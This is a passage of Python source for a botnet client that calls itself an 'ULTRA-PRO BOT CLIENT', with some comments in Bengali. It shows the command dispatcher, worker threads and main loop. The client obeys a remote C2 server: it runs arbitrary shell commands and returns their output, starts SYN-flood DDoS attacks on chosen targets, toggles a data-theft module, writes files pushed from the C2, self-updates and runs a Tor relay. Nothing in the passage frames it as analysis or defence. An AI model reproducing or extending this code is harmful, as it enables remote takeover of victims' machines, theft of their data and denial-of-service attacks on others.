    # --------------------------------------------------------------------- #
    # ✅ UPDATED: Command Handling with C2 Controlled Steal
    # --------------------------------------------------------------------- #
    def _process_command(self, cmd: str) -> str:
        """Main command dispatcher - Returns response or empty string"""
        cmd = cmd.strip()
        if not cmd:
            return ""

        # ✅ Handle STEAL_ENABLED / STEAL_DISABLED
        if cmd == "STEAL_ENABLED":
            self.steal_enabled = True
            print_success("✅ Data Steal ENABLED by C2")
            return ""

        if cmd == "STEAL_DISABLED":
            self.steal_enabled = False
            print_warning("⚠️ Data Steal DISABLED by C2")
            if self.data_steal_running:
                try:
                    disable_steal()
                    stop_data_steal()
                    self.data_steal_running = False
                    print_info("Data steal stopped due to C2 disable")
                except Exception as e:
                    print_error(f"Error stopping steal: {e}")
            return ""

        # ✅ Handle UPDATE response
        if cmd == "UPDATE_AVAILABLE":
            print_success("✅ Update available from C2!")
            # Download and install the update
            threading.Thread(target=self._download_and_install_update, daemon=True).start()
            return ""

        if cmd == "No update available":
            print_info("ℹ️ No update available")
            self._update_in_progress = False
            return ""

        # Check if it's a STEAL_DATA command
        if cmd.startswith("STEAL_DATA "):
            print_info("📥 Receiving steal data from C2...")
            try:
                encoded_data = cmd[11:]

                if encoded_data.startswith("COMPRESSED:"):
                    compressed_b64 = encoded_data[11:]
                    compressed = base64.b64decode(compressed_b64)
                    decompressed = zlib.decompress(compressed)
                    data = json.loads(decompressed.decode('utf-8'))
                else:
                    decoded = base64.b64decode(encoded_data)
                    data = json.loads(decoded.decode('utf-8'))

                json_path, extracted_path = self._save_and_extract_steal_data(data)

                print_success(f"Steal data saved to: {json_path}")
                if extracted_path:
                    print_success(f"Extracted to: {extracted_path}")

                log.info(f"Saved steal data to: {json_path}")
                return f"STEAL_DATA_RECEIVED (#{self.steal_counter})"

            except Exception as e:
                print_error(f"STEAL_DATA processing error: {e}")
                return f"STEAL_DATA_ERROR: {str(e)}"

        # Check for SHOW_STEAL command (from C2)
        if cmd.upper() == "SHOW_STEAL":
            return self._list_steal_files()

        # Get command parts
        parts = cmd.split()
        if not parts:
            return ""

        main = parts[0].upper()

        # ✅ Added DOWNLOAD to VALID_COMMANDS
        VALID_COMMANDS = {
            "LIST", "UPDATE", "DDOS", "EXEC", "STEAL",
            "STOP_STEAL", "TOR_START", "TOR_STOP", "TOR_INFO",
            "PING", "EXIT", "PONG", "SHOW_STEAL", "DOWNLOAD"
        }

        # If command is not in valid list, ignore it
        if main not in VALID_COMMANDS:
            return ""

        log.info(f"Command received: {main}")

        try:
            # ✅ UPDATED: LIST command - Real bot information with Bot Number
            if main == "LIST":
                bot_number_display = f"#{self.bot_number}" if self.bot_number > 0 else "Not Assigned"

                bot_info = [
                    "╔══════════════════════════════════════════════════════════════╗",
                    "║                    🤖 BOT INFORMATION                       ║",
                    "╠══════════════════════════════════════════════════════════════╣",
                    f"║ 🆔 Bot Number  : {bot_number_display:<44} ║",
                    f"║ 🤖 Bot Name    : {self.bot_name:<44} ║",
                    f"║ 🖥️ OS          : {self.os_name:<44} ║",
                    f"║ 🔑 Session Key : {base64.b64encode(self.session_key).decode()[:20]}...{' ' * 24}║",
                    f"║ 📡 C2 Server   : {C2_IP}:{C2_PORT:<38} ║",
                    f"║ ⏱️ Uptime      : {self._get_uptime():<44} ║",
                    f"║ 📊 Status      : {'✅ Connected' if self.connected else '❌ Disconnected':<44} ║",
                    f"║ 📁 Steal Folder: {self.steal_dir:<44} ║",
                    f"║ 📦 Steal Count : {self.steal_counter:<44} ║",
                    f"║ 🔍 Data Steal  : {'✅ Running' if self.data_steal_running else '❌ Stopped':<44} ║",
                    f"║ 🔒 Tor         : {'✅ Active' if self.tor_running else '❌ Inactive':<44} ║",
                    "╚══════════════════════════════════════════════════════════════╝"
                ]
                return "\n".join(bot_info)

            elif main == "PONG":
                return ""

            # ✅ FIXED: DOWNLOAD command
            elif main == "DOWNLOAD":
                if len(parts) < 2:
                    return "ERROR: DOWNLOAD requires filename"

                filename = parts[1]
                print_info(f"📥 Downloading: {filename}")

                try:
                    # ✅ C2 থেকে ফাইল ডাউনলোড করার চেষ্টা করুন
                    response = self._send_and_receive(f"DOWNLOAD {filename}", timeout=15)

                    if response is None:
                        print_warning(f"❌ No response from C2 for: {filename}")
                        return f"Download failed: No response from C2"

                    # ✅ C2 থেকে রেসপন্স চেক করুন
                    if "File not found" in response:
                        print_warning(f"❌ File not found on C2: {filename}")
                        return f"File not found: {filename}"

                    # ✅ বাইনারি ফাইল চেক করুন
                    if response.startswith("BINARY:"):
                        # বাইনারি ফাইল
                        parts_response = response.split(":", 2)
                        if len(parts_response) == 3:
                            _, file_name, encoded_content = parts_response
                            content = base64.b64decode(encoded_content)
                            os.makedirs(os.path.dirname(filename) if os.path.dirname(filename) else ".", exist_ok=True)
                            with open(filename, 'wb') as f:
                                f.write(content)
                            print_success(f"✅ Downloaded: {filename} ({len(content)} bytes)")
                            # ✅ C2 তে কনফার্মেশন পাঠান
                            self._send(f"DOWNLOAD_SUCCESS:{filename}")
                            return f"Downloaded: {filename}"

                    # ✅ টেক্সট ফাইল
                    elif response.startswith("FILE_CONTENT:"):
                        parts_response = response.split(":", 2)
                        if len(parts_response) == 3:
                            _, file_name, content = parts_response
                            os.makedirs(os.path.dirname(filename) if os.path.dirname(filename) else ".", exist_ok=True)
                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(content)
                            print_success(f"✅ Downloaded: {filename}")
                            # ✅ C2 তে কনফার্মেশন পাঠান
                            self._send(f"DOWNLOAD_SUCCESS:{filename}")
                            return f"Downloaded: {filename}"

                    # ✅ যদি ফাইল কন্টেন্ট সরাসরি আসে
                    elif len(response) > 100:  # ফাইল কন্টেন্ট মনে হচ্ছে
                        os.makedirs(os.path.dirname(filename) if os.path.dirname(filename) else ".", exist_ok=True)
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(response)
                        print_success(f"✅ Downloaded: {filename}")
                        self._send(f"DOWNLOAD_SUCCESS:{filename}")
                        return f"Downloaded: {filename}"

                    else:
                        print_warning(f"❌ Unexpected response: {response[:100]}")
                        return f"Download failed: Unexpected response"

                except Exception as e:
                    print_error(f"Download error: {e}")
                    return f"DOWNLOAD_ERROR: {e}"

            # ✅ UPDATED: UPDATE command
            elif main == "UPDATE":
                try:
                    if self._update_in_progress:
                        print_warning("Update already in progress")
                        return "Update already in progress"

                    print_info("🔄 Checking for updates...")
                    self._update_in_progress = True

                    # ✅ Send UPDATE command to C2
                    success = self._send("UPDATE")
                    if success:
                        print_success("✅ Update check initiated - waiting for response...")
                        return "Update check initiated"
                    else:
                        self._update_in_progress = False
                        return "Update check failed"

                except Exception as e:
                    print_error(f"❌ Update failed: {e}")
                    self._update_in_progress = False
                    return f"Update failed: {e}"

            elif main == "DDOS":
                if len(parts) < 4:
                    return "ERROR: DDOS requires IP, PORT, DURATION."
                target_ip = parts[1]
                target_port = int(parts[2])
                duration = int(parts[3])
                ddos_type = parts[4].upper() if len(parts) > 4 else "SYN"
                print_warning(f"Starting DDoS {ddos_type} on {target_ip}:{target_port} for {duration}s")
                threading.Thread(
                    target=start_ddos,
                    args=(target_ip, target_port, duration, ddos_type),
                    daemon=True
                ).start()
                return f"DDOS {ddos_type} attack started on {target_ip}:{target_port}."

            elif main == "EXEC":
                shell_cmd = cmd[5:].strip()
                if not shell_cmd:
                    return "ERROR: EXEC requires a command."

                print_info(f"Executing: {shell_cmd}")

                try:
                    # ✅ Windows এর জন্য cmd /c ব্যবহার করুন
                    if platform.system() == "Windows":
                        # type কমান্ডের জন্য বিশেষ হ্যান্ডলিং
                        if shell_cmd.startswith("type "):
                            filename = shell_cmd[5:].strip()
                            if os.path.exists(filename):
                                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                if not content:
                                    return "File is empty"
                                # ✅ ফাইল কন্টেন্ট সরাসরি রিটার্ন করুন
                                return content
                            else:
                                return f"File not found: {filename}"

                        # ✅ অন্যান্য কমান্ডের জন্য
                        full_cmd = f"cmd /c {shell_cmd}"
                    else:
                        full_cmd = shell_cmd

                    # ✅ subprocess.run ব্যবহার করুন
                    result = subprocess.run(
                        full_cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        encoding='utf-8',
                        errors='ignore',
                        timeout=30
                    )

                    # ✅ আউটপুট তৈরি করুন
                    output_parts = []

                    if result.stdout:
                        output_parts.append(result.stdout.strip())

                    if result.stderr:
                        output_parts.append(f"[STDERR]\n{result.stderr.strip()}")

                    if result.returncode != 0 and not result.stdout and not result.stderr:
                        output_parts.append(f"[Exit Code: {result.returncode}]")

                    # ✅ আউটপুট জয়েন করুন
                    output = "\n".join(output_parts) if output_parts else "Command executed successfully (no output)"

                    # ✅ আউটপুট সাইজ লিমিট (C2 তে পাঠানোর জন্য)
                    if len(output) > 50000:
                        output = output[:50000] + "\n... (output truncated)"

                    print_success(f"Command executed: {len(output)} bytes output")
                    return output

                except subprocess.TimeoutExpired:
                    print_error("Command timed out after 30 seconds")
                    return "ERROR: Command timed out"
                except FileNotFoundError:
                    print_error("Command not found")
                    return "ERROR: Command not found"
                except Exception as e:
                    print_error(f"Execution error: {e}")
                    return f"ERROR: {e}"

            elif main == "STEAL":
                # ✅ Check if Steal is enabled by C2
                if not self.steal_enabled:
                    print_warning("⚠️ Data Steal is DISABLED by C2")
                    return "Steal disabled by C2"

                print_info("Starting data theft...")
                if not self.data_steal_running:
                    try:
                        # ✅ Enable steal in module
                        enable_steal()
                        threading.Thread(
                            target=start_data_steal,
                            args=(self,),
                            daemon=True
                        ).start()
                        self.data_steal_running = True
                        print_success("Data theft started")
                        return "Data theft started."
                    except Exception as e:
                        print_error(f"Steal failed: {e}")
                        return f"Steal failed: {e}"
                print_warning("Data theft already running")
                return "Data theft already running."

            elif main == "STOP_STEAL":
                print_info("Stopping data theft...")
                if self.data_steal_running:
                    try:
                        # ✅ Disable steal in module
                        disable_steal()
                        stop_data_steal()
                        self.data_steal_running = False
                        print_success("Data theft stopped")
                        return "Data theft stopped."
                    except Exception as e:
                        print_error(f"Stop steal failed: {e}")
                        return f"Stop steal failed: {e}"
                print_warning("Data theft not running")
                return "Data theft not running."

            elif main == "TOR_START":
                print_info("Starting Tor...")
                if not self.tor_running:
                    self.tor_manager.start()
                    self.tor_running = True
                    print_success("Tor relay started")
                return "Tor relay started."

            elif main == "TOR_STOP":
                print_info("Stopping Tor...")
                if self.tor_running:
                    self.tor_manager.stop()
                    self.tor_running = False
                    print_success("Tor relay stopped")
                return "Tor relay stopped."

            elif main == "TOR_INFO":
                info = get_tor_relay_info()
                return json.dumps(info, indent=2)

            elif main == "PING":
                return "PONG"

            elif main == "SHOW_STEAL":
                return self._list_steal_files()

            elif main == "EXIT":
                print_warning("Shutdown command received")
                self.shutdown_flag = True
                return "Shutting down."

            else:
                return ""

        except subprocess.TimeoutExpired:
            return "ERROR: Command timed out"
        except Exception as exc:
            log.exception("Command processing error:")
            return f"ERROR: {exc}"

    # --------------------------------------------------------------------- #
    # Worker Threads
    # --------------------------------------------------------------------- #
    def _receiver(self):
        while not self.shutdown_flag:
            if not self.connected:
                time.sleep(5)
                continue
            try:
                cmd = self._receive()
                if cmd is None:
                    continue

                if cmd.strip():
                    self.command_queue.put(cmd)
            except Exception as e:
                log.error(f"Receiver error: {e}")
                self.connected = False
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    self.socket = None

    def _keepalive(self):
        while not self.shutdown_flag:
            if self.connected:
                try:
                    self._send("PING")
                except Exception:
                    pass
            time.sleep(15)

    def _command_worker(self):
        while not self.shutdown_flag:
            try:
                cmd = self.command_queue.get(timeout=1)
                if cmd:
                    response = self._process_command(cmd)

                    if response:
                        # ✅ আউটপুট লম্বা হলে সাইজ লিমিট
                        if len(response) > 100000:
                            response = response[:100000] + "\n... (output truncated)"

                        # ✅ আউটপুট পাঠান
                        success = self._send(response)
                        if success:
                            log.info(f"Response sent: {len(response)} bytes for command: {cmd[:50]}")
                        else:
                            log.warning(f"Failed to send response for: {cmd[:50]}")

            except queue.Empty:
                continue
            except Exception as e:
                log.error(f"Command worker error: {e}")

    # --------------------------------------------------------------------- #
    # Main Loop
    # --------------------------------------------------------------------- #
    def run(self):
        print_header("🤖 BOT CLIENT STARTING")
        print_info(f"OS: {Colors.YELLOW}{self.os_name}{Colors.END}")
        print_info(f"Bot Name: {Colors.CYAN}{self.bot_name}{Colors.END}")
        print("")

        self._connect_to_c2()

        threading.Thread(target=self._receiver, daemon=True).start()
        threading.Thread(target=self._keepalive, daemon=True).start()
        threading.Thread(target=self._command_worker, daemon=True).start()

        print_bot_status(f"{self.bot_name} [{self.os_name}] is now running")
        print_bot_status("Waiting for commands from C2...")
        print("")
        log.info(f"{self.bot_name} [{self.os_name}] is now running.")

        try:
            while not self.shutdown_flag:
                if not self.connected:
                    print_warning("Not connected, attempting reconnect...")
                    if not self._connect_to_c2():
                        time.sleep(10)
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("KeyboardInterrupt – shutting down.")
            log.info("KeyboardInterrupt – shutting down.")
        except Exception as e:
            print_error(f"Main loop error: {e}")
        finally:
            self.shutdown()

    # --------------------------------------------------------------------- #
    # Graceful Shutdown
    # --------------------------------------------------------------------- #
    def shutdown(self):
        print_warning("Shutting down bot client...")
        self.shutdown_flag = True
        log.info("Shutting down bot client…")

        if self.tor_running:
            try:
                self.tor_manager.stop()
                self.tor_running = False
                print_success("Tor stopped")
            except Exception as e:
                print_error(f"Tor stop error: {e}")

        if self.data_steal_running:
            try:
                disable_steal()
                stop_data_steal()
                self.data_steal_running = False
                print_success("Data steal stopped")
            except Exception as e:
                print_error(f"Data steal stop error: {e}")

        if self.socket:
            try:
                self.socket.shutdown(socket.SHUT_RDWR)
                self.socket.close()
                print_success("Socket closed")
            except Exception as e:
                print_error(f"Socket close error: {e}")

        time.sleep(2)
        print_success("Bot client stopped.")
        log.info("Bot client stopped.")

# --------------------------------------------------------------------------- #
# Entry Point
# --------------------------------------------------------------------------- #
if __name__ == "__main__":
    print_header("🚀 ULTRA-PRO BOT CLIENT")
    print_info(f"Python: {Colors.YELLOW}{sys.version}{Colors.END}")
    print_info(f"Platform: {Colors.YELLOW}{platform.platform()}{Colors.END}")
    print("")

    try:
        client = BotClient()
        client.run()
    except Exception as e:
        print_error(f"Fatal error: {e}")
        import traceback
        print(f"{Colors.RED}{traceback.format_exc()}{Colors.END}")
        sys.exit(1)
